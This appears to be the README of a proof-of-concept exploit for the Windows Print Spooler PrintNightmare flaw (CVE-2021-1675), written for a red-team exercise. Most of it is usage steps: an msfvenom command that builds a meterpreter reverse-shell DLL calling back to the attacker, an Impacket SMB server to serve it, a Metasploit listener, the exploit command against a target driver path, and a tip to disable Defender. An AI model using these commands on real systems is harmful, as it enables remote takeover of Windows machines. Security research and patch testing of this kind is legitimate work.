# CNightmare - CVE-2021-1675 POC

### Warning

Obviously, this exploit has long been patched, however, I have no doubt there would still be systems around that are vulnerable to this kind of attack. Therefore, under no circumstances is this exploit to be used on a system which the individual running the exploit either does not own or does not have explicit permission to do so.

### Description

As the title suggests, this is a POC which exploits the infamous PrintNightmare vulnerability in Microsoft Windows Print Spooler service. At present, I have implemented the ability to run this on a remote host so technically it only exploits CVE-2021-1675. 

This is by no means the best POC and it was completed as part of [eversinc33](https://github.com/eversinc33) Red Team Advent of Code. 

### Compile

Easiest way would probably just be to open it up in Visual Studio and compile it that way. Alternatively, you could use GCC.

### Usage

First Create a malicious DLL file with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-IP> LPORT=4444 -f dll -o shell.dll
```

Then move it to `/tmp/Data/`, then use **Impacket** to serve a SMB server:
```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/Data/
```

Open metasploit and start a listener:
```bash
msfconsole
use exploit/mutli/handler
set lhost <your-IP>
set payload windows/x64/meterpreter/reverse_tcp
run
```

From there, you can now transfer the exploit to your target system and run it like so:
```powershell
.\CNightmare-CVE-2021-34527-POC.exe \\192.168.158.138\compdata\shell.dll 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'
```
Ensure you have the actual driver path for you system, which can be found by browsing to `C:\Windows\System32\DriverStore\FileRepository\` and go from there.

NOTE: You may have to run it a few times to get a callback. Also you will likely need to turn Defender off as it will probably detect meterpreter. Defender was a bit hit and miss in my testing.

### Testing System

I pulled an image from here [tb.rg-adguard.net.](https://tb.rg-adguard.net/dump.php?seach=windows+1809&str=25&lang=en-US)